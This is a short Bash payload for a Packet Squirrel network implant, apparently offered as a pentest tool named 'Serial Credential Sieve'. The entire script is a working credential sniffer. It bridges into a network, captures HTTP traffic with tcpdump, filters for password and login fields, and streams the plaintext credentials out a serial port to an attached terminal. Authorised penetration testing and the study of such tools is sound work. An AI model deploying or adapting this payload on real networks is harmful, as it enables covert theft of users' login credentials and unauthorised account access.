#!/bin/bash
# 
# Title:        Serial Credential Sieve
# Description:  Greps for plaintext passwords in HTTP traffic and pushes them to UART.
# Author:       James Cupps
# Version:      1.0
# Category:     pentest
# Target:       Any
# Net Mode:     BRIDGE
#
# USAGE: Connect a serial terminal (e.g., Flipper Zero, laptop with USB-UART 
#        adapter) to the Squirrel's UART pins at 115200 baud. Captured
#        credentials stream in real-time.

function run_sieve() {
    NETMODE BRIDGE
    sleep 5

    # Indicate sniffing is active (Blinking Purple)
    LED SPECIAL

    # Configure the serial port baud rate (standard 115200)
    stty -F /dev/ttyS0 115200

    # 1. Run tcpdump specifically on port 80 (HTTP)
    # 2. Output in ASCII (-A) and buffer line-by-line (-l)
    # 3. Use grep to filter for "pass", "pwd", or "login"
    # 4. Redirect output straight out the hardware serial port
    tcpdump -l -A -i br-lan tcp port 80 2>/dev/null | grep --line-buffered -iE 'pass=|pwd=|login=' > /dev/ttyS0 &
    
    # Wait for the button press to kill the capture
    NO_LED=true BUTTON
    killall tcpdump
    
    LED G SUCCESS
}

run_sieve &
wait
